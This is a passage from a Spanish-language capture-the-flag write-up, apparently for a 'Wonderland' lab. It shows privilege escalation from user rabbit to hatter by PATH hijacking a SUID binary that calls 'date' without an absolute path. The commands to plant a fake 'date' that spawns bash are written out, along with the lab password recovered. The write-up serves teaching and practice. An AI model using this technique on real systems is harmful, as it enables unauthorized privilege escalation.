# Fase 4 — Escalada: rabbit → hatter (PATH hijacking en binario SUID)

[← Volver al README](../README.md) · [← Fase anterior](./03-privesc-alice-to-rabbit.md)

En el home de `rabbit` hay un binario con el bit SUID activo:

```bash
ls -la /home/rabbit
-rwsr-sr-x 1 root root 8432 ... teaParty
```

Al ejecutarlo:

```
$ ./teaParty
Welcome to the tea party!
Probably by <fecha>
Segmentation fault (core dumped)
```

Analizando las cadenas del binario:

```bash
strings teaParty
```

Entre los resultados aparece una llamada relevante:

```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

El binario invoca `date` **sin ruta absoluta**, lo que lo hace vulnerable a *PATH hijacking*: si se antepone un directorio propio al `$PATH` con un ejecutable llamado `date`, el sistema ejecutará ese en lugar del real.

```bash
echo "/bin/bash" > /home/rabbit/date
chmod +x /home/rabbit/date
export PATH=/home/rabbit:$PATH
./teaParty
```

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```

Se obtiene una shell como **hatter**. Dentro de su home hay una contraseña:

```bash
cat /home/hatter/password.txt
WhyIsARavenLikeAWritingDesk?
```

(Recomendable reconectar por SSH con `hatter` para tener un entorno limpio antes del siguiente paso.)

➡️ Siguiente: [Fase 5 — hatter → root (Linux capabilities)](./05-privesc-hatter-to-root.md)
